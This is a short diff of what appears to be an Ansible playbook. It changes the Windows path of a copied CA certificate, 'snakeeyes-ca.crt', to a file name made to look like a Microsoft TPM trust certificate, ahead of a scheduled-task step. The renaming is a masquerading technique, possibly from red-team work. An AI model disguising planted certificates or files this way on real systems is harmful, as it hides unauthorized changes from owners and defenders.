@@ -12,7 +12,7 @@
 - name: Copy CA cert to Windows Host
   ansible.windows.win_copy:
     src: "snakeeyes-ca.crt"
-    dest: "C:\\ProgramData\\Microsoft\\Network\\Settings\\snakeeyes-ca.crt"
+    dest: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\Microsoft_TPM_Network_DSA_Trust.crt"
 
 - name: Create scheduled task
   community.windows.win_scheduled_task:
